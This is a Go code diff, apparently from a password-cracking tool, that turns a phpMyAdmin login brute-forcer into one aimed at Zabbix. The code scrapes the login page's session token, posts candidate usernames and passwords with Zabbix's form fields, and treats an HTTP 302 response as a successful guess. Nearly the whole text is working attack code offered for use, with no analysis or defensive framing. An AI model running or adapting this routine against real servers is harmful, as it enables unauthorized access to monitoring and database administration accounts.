@@ -11,7 +11,7 @@ import (
 	"strings"
 )
 
-func PhpmyadminCrack(task model.CrackTask) (result model.CrackTaskResult) {
+func ZabbixCrack(task model.CrackTask) (result model.CrackTaskResult) {
 	result = model.CrackTaskResult{CrackTask: task, Result: "", Err: nil}
 	clt := http.Client{}
 	req, _ := http.NewRequest("GET", task.Ip, nil)
@@ -28,8 +28,7 @@ func PhpmyadminCrack(task model.CrackTask) (result model.CrackTaskResult) {
 	c := bufio.NewReader(resp.Body)
 	c.Read(data)
 	resp.Body.Close()
-	//content, _ := ioutil.ReadAll(resp.Body)
-	r := regexp.MustCompile(`(?U)name="token" value="(.*)"`)
+	r := regexp.MustCompile(`(?U)name="sid" value="(.*)"`)
 	match := r.FindStringSubmatch(string(data))
 	if match == nil {
 		return
@@ -48,11 +47,11 @@ func PhpmyadminCrack(task model.CrackTask) (result model.CrackTaskResult) {
 	//fmt.Println(jar.Cookies(host))
 
 	urlValues := url.Values{}
-	urlValues.Add("pma_username", task.Auth.User)
-	urlValues.Add("pma_password", task.Auth.Password)
-	urlValues.Add("pma_lang", "zh_CN")
-	urlValues.Add("server", "1")
-	urlValues.Add("token", token)
+	urlValues.Add("name", task.Auth.User)
+	urlValues.Add("password", task.Auth.Password)
+	urlValues.Add("form_refresh", "1")
+	urlValues.Add("enter", "Sign in")
+	urlValues.Add("sid", token)
 
 	body := strings.NewReader(urlValues.Encode())
 	req2, _ := http.NewRequest("POST", task.Ip, body)
@@ -61,8 +60,6 @@ func PhpmyadminCrack(task model.CrackTask) (result model.CrackTaskResult) {
 	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
 	resp2, _ := crackClt.Do(req2)
-	//resp2, _ := crackClt.PostForm(task.Ip, urlValues)
-	//resp2, _ := crackClt.Post(task.Ip, urlValues)
 	defer resp2.Body.Close()
 	if resp2.StatusCode == 302 {
 		result.Result = fmt.Sprintf("User: %s \tPassword: %s", task.Auth.User, task.Auth.Password)
